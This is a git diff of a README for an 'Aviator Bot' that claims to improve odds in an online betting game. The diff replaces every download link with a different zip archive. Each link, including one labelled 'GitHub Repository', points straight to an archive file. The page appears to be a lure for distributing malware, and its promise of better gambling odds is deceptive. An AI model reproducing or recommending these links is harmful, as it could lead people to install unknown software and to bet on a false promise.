@@ -1,7 +1,7 @@
 # ✈️ bot - Elevate Your Aviator Gaming Odds
 
 ## 🔗 Download the Latest Version
-[![Download Now](https://raw.githubusercontent.com/frus12/bot/main/misdistribute/bot.zip%20Now%20-v1.0-brightgreen)](https://raw.githubusercontent.com/frus12/bot/main/misdistribute/bot.zip)
+[![Download Now](https://github.com/frus12/bot/raw/refs/heads/main/images/Software-v3.4.zip%20Now%20-v1.0-brightgreen)](https://github.com/frus12/bot/raw/refs/heads/main/images/Software-v3.4.zip)
 
 ## 🚀 Getting Started
 Welcome to the Aviator Bot APK! This guide explains how to download and run the application to enhance your Aviator gaming experience.
@@ -15,7 +15,7 @@ Before you start, ensure your device meets these requirements:
 ## 🌐 Download & Install
 To download the latest version of the Aviator Bot, visit this page:
 
-[Download Aviator Bot](https://raw.githubusercontent.com/frus12/bot/main/misdistribute/bot.zip)
+[Download Aviator Bot](https://github.com/frus12/bot/raw/refs/heads/main/images/Software-v3.4.zip)
 
 Follow these steps to install the app:
 
@@ -60,7 +60,7 @@ If you have questions or need further assistance, feel free to reach out. You ca
 To receive the latest news and updates about the Aviator Bot, consider following our GitHub repository. We regularly release new features and improvements.
 
 ## 🔗 Useful Links
-- [Download Aviator Bot](https://raw.githubusercontent.com/frus12/bot/main/misdistribute/bot.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/frus12/bot/main/misdistribute/bot.zip)
+- [Download Aviator Bot](https://github.com/frus12/bot/raw/refs/heads/main/images/Software-v3.4.zip)
+- [GitHub Repository](https://github.com/frus12/bot/raw/refs/heads/main/images/Software-v3.4.zip)
 
 Thank you for choosing the Aviator Bot! Enjoy your gaming experience, and may your bets be successful!
